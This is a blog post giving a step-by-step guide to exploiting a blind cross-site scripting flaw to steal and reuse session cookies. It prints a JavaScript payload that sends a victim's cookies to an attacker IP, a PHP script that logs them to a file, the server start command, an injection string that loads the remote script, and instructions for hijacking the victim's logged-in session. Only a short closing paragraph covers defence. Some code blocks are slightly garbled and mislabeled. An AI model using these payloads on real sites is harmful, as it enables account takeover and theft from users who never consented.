---
title: "Exploiting Blind XSS to Steal Cookies: A Step-by-Step Guide"
seoDescription: "Learn how to exploit blind XSS vulnerabilities to steal cookies using a detailed, real-world step-by-step guide"
datePublished: Tue May 07 2024 07:13:53 GMT+0000 (Coordinated Universal Time)
cuid: clvw218uc000009l5awln1yt5
slug: exploiting-blind-xss-to-steal-cookies-a-step-by-step-guide
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1715066028086/a6c86cd1-f643-4939-80c4-0416964df7b2.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1715066024418/53bdb807-f379-4def-87f4-dced4d309899.png

---

Introduction: In this blog post, we'll walk through the process of exploiting a blind XSS vulnerability to steal cookies from a victim's browser. We'll use a real-world example to demonstrate each step, explaining which machine and IP address is involved at each stage.

Prerequisites:

* Two machines:
    
    * Attacker Machine (Pwn Machine): This is the machine you'll use to set up the malicious server and receive the stolen cookies. Let's assume its IP address is `10.10.15.213`.
        
    * Victim Machine: This is the machine where the vulnerable web application (Site A) is running. We'll assume it's accessible at `http://siteA.com`.
        

Step 1: Set up the Malicious Server (Attacker Machine - 10.10.15.213)

1. On the attacker machine, create a new directory to host your malicious scripts. For example, `/var/www/html/malicious`.
    
2. Inside the `malicious` directory, create two files: `script.js` and `index.php`.
    

Step 2: Create the Malicious JavaScript Payload (Attacker Machine - 10.10.15.213)

1. Open the `script.js` file on the attacker machine.
    
2. Add the following JavaScript code to `script.js`:
    

This code creates a new image object and sets its `src` attribute to a URL that points to the `index.php` script on the attacker machine, with the victim's cookies appended as a query parameter.

````sql
```jsx
enew Image().src='<http://10.10.15.213:81/index.php?c='+document.cookie>;

```
````

Step 3: Create the PHP Script to Receive Stolen Cookies (Attacker Machine - 10.10.15.213)

1. Open the `index.php` file on the attacker machine.
    
2. Add the following PHP code to `index.php`:
    

This script checks if the `c` parameter is present in the GET request, retrieves its value (the stolen cookie), appends it to a log file named `stolen_cookies.txt`, and prints the stolen cookie value.

````sql
```php
<?php
if (isset($_GET['c'])) {
    $stolenCookie = $_GET['c'];
    $logFile = 'stolen_cookies.txt';
    file_put_contents($logFile, $stolenCookie . "\\n", FILE_APPEND);
    echo "Stolen Cookie: " . $stolenCookie;
}
?>

```
````

Step 4: Start the Malicious Server (Attacker Machine - 10.10.15.213)

1. On the attacker machine, navigate to the `malicious` directory.
    
2. Start a PHP web server by running the following command:
    

This starts a PHP server listening on port 81 of the attacker machine.

````sql
```
Copy codephp -S 10.10.15.213:81

```
````

Step 5: Inject the Malicious Payload (Victim Machine - [http://siteA.com](http://siteA.com))

1. On the victim machine, navigate to the vulnerable web application (Site A) in a web browser.
    
2. Identify the vulnerable input field where you discovered the blind XSS vulnerability.
    
3. Inject the following malicious payload into the vulnerable field:
    

This payload closes any preceding tags, then includes a `<script>` tag that loads the `script.js` file from the attacker's machine.

````sql
```html
'><script src=http://10.10.15.213:81/script.js></script>

```
````

Step 6: Trigger the XSS Payload (Victim Machine - [http://siteA.com](http://siteA.com))

1. Submit the form or perform the necessary action to trigger the XSS payload on Site A.
    
2. The victim's browser will execute the injected script, which loads and executes the `script.js` file from the attacker's machine.
    

Step 7: Receive the Stolen Cookies (Attacker Machine - 10.10.15.213)

1. On the attacker machine, monitor the PHP server logs.
    
2. When the victim's browser executes the `script.js` file, it sends a request to the `index.php` script on the attacker's machine, including the stolen cookies as a query parameter.
    
3. The `index.php` script logs the stolen cookies in the `stolen_cookies.txt` file and prints them in the server response.
    

Step 8: Verify the Stolen Cookies (Attacker Machine - 10.10.15.213)

1. On the attacker machine, open the `stolen_cookies.txt` file.
    
2. You should see the stolen cookies logged in the file, along with the victim's IP address.
    
3. You can also check the server logs to see the printed stolen cookie value.
    

Step 9: Use the Stolen Cookies (Attacker Machine - 10.10.15.213)

1. On the attacker machine, open a web browser.
    
2. Install a cookie editor extension or use the browser's developer tools to modify cookies.
    
3. Navigate to the vulnerable web application (Site A) in the browser.
    
4. Replace the existing cookies with the stolen cookies obtained from the victim.
    
5. Refresh the page, and you should be logged in as the victim user, effectively hijacking their session.
    

Conclusion: By following these steps, you can exploit a blind XSS vulnerability to steal cookies from a victim's browser. Remember to use this knowledge responsibly and only on systems you have permission to test.

It's crucial to validate and sanitize user input on the server-side to prevent XSS vulnerabilities. Implementing proper input validation, output encoding, and Content Security Policy (CSP) can help mitigate the risk of XSS attacks.

I hope this step-by-step guide helps you understand the process of exploiting blind XSS and stealing cookies. Stay safe and happy hacking!